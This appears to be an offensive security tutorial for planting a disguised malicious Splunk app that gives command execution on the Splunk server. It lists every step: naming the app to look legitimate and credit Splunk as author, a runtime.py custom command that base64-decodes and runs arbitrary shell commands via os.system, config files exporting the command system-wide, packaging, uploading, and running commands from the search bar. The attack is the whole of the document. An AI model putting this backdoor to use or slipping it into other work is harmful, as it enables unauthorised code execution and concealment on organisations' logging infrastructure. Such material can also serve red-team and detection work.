# Splunk Application Reverse Shell

## Steps

### 1) Create a working directory

    cd ~; mkdir splunk

### 2) Create an app and give it a legitimate name to hide in plain sight

    mkdir 'SPLUNK_TOTALLY_LEGIT_APP'; cd SPLUNK_TOTALLY_LEGIT_APP
    mkdir bin default metadata

### 3) Create a program that executes commands (there are various techniques)

A command execution technique that doesn't depend on egress from the AWS environment being allowed.

#### runtime.py

    output_file_path = "/tmp/output.txt"
    
    try:
        command = base64.b64decode(sys.argv[1]).decode("utf-8")
    
        with open(output_file_path, "w") as output_file:
            exit_code = sys.modules['os'].system(f"{command} > {output_file_path} 2>&1")
    
        if exit_code != 0:
            results = splunk.Intersplunk.generateErrorResults(f"Error: Command exited with code {exit_code}")
    except Exception:
        import traceback
        stack = traceback.format_exc()
        results = splunk.Intersplunk.generateErrorResults("Error : Traceback: " + str(stack))
    
    splunk.Intersplunk.outputResults(results)

### 4) Create more files with the below contents

default/app.conf

    [launcher]
    author=Splunk
    description=Runtime app
    version=0.6
    [ui]
    is_visible = true

default/commands.conf

    [runtime]
    type = python
    filename = runtime.py
    local = false
    enableheader = false
    streaming = false
    perf_warn_limit = 0

metadata/default.meta

    [commands]
    export = system

### 5) Create an archive

    tar -czvf 'SPLUNK_TOTALLY_LEGIT_APP.tar.gz' 'SPLUNK_TOTALLY_LEGIT_APP'

### 6) In the Apps list, click Install app from file. Then browse to the malicious add-in and upload it.

<img width="1920" height="588" alt="image" src="https://github.com/user-attachments/assets/6cfeb38a-4222-4b88-88e9-c008787bd3ef" />

### 7) Clicking on it from the app menu brings us to a Splunk search field.

### 8) Run command

Base64 the command

    echo -n 'whoami' | base64

Run it in the search bar

    * | script runtime d2hvYW1p

